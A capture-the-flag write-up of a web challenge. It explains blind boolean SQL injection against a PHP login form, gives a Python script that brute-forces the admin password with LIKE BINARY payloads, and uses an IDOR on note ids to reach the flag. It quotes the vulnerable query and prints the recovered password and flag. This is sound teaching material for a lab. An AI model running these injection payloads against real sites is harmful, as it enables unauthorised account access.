# Web2 Challenge Writeup Speedrun Any%

I'll try to keep my writeups on the more concise side compared to everybody else, while still going over the core ideas of each exploit.

This challenge has two parts:
1. Finding/Getting a valid login username and password to login into the website to access the second part.
2. Getting the flag using the IDOR exploit.

The first part is all about blind boolean SQL injection. Essentially, it is based on the premise that webpages will behave differently
based on the boolean values returned by the SQL queries in the background. This part takes a little bit of patient because you have
to figure out bits and pieces of the login information through a lot of SQL injection queries (like each letter of the password).

Looking at the source code, we can see the SQL query that we have to modify to return different boolean values to get at the login information

```php
// XXX: this is vuln to SQL injection!
$query_str = "SELECT id, username, password FROM users WHERE username='$username';";
```

This tells us that we should be using the username field to inject our own SQL commands, the page displays the query result so we can figure out
character by character what the password and username are.

Maybe you got lucky or intuitively guessed the username (or you ended up trying all the options), but `admin` is a valid username that when entered into the username field, gives a response
of `The password is incorrect` rather than `The user is not found` so we know we are onto something.

The hint given is that we should use the `LIKE` clause to figure out the password, we need to use single quotes to escape out of the username
in the query and then add on the LIKE clause after `password` to try to get the page to hint us on whether or not our password is correct.
We would also need to use some wildcards like `%` to essentially indicate that we want to check for passwords that start with the letter we input.

The page tells us that the password is incorrect if our username is correct but not the password, now that we have the password guess in addition
to the username in the SQL query for the username field, if whatever we have in the username field is correct (which would be both the username and the password clause), then it should print out that the password is incorrect.

Guessing every possible valid character for the password by hand would take forever, so we use a script to automatically guess characters for the password.

```python
import requests as r
import string as s

password = ""
while(True):
    for i in s.printable:
        if i in '%_':
            continue
        guess = "admin' and password LIKE BINARY '{}%".format(password+i)
        data = {"username": guess, "password": "test"}
        print(data)
        response = r.post("http://ctf-league.osusec.org:8080/login.php", data=data)
        if "That password is incorrect" in str(response.content):
            print(i)
            password += i
            print(password)
```

The script runs and prints out the password used if the query resulted in a response indicating that the password query matched a password in the system.
We use the BINARY clause to differentiate between upper and lowercase when brute forcing characters for the password.

The script infinitely loops when it is done getting the password, which is `kl62jdicu31ad`

Once we login, we get to the IDOR exploit. IDOR is where the user is exposed to some kind of data or object that isn't secured or controlled.
By modifying that insecure data, we can bypass security or some other functionality and access things we weren't meant to.

When we click on a note, we notice a data field in the URL: `http://ctf-league.osusec.org:8080/note.php?id=21`
More specifically, we can intuit that the `id` field in the URL increments as more notes are created.

The challenge states that the flag is in one of the first notes, so we decrease the id to 1, it tells us that the id is in the next note,
so we increment, and the note that loads has the flag.

`flag{r3m3mber_t0-g00gle_wh3n_f@cing_a_d1fficult-challenge!}`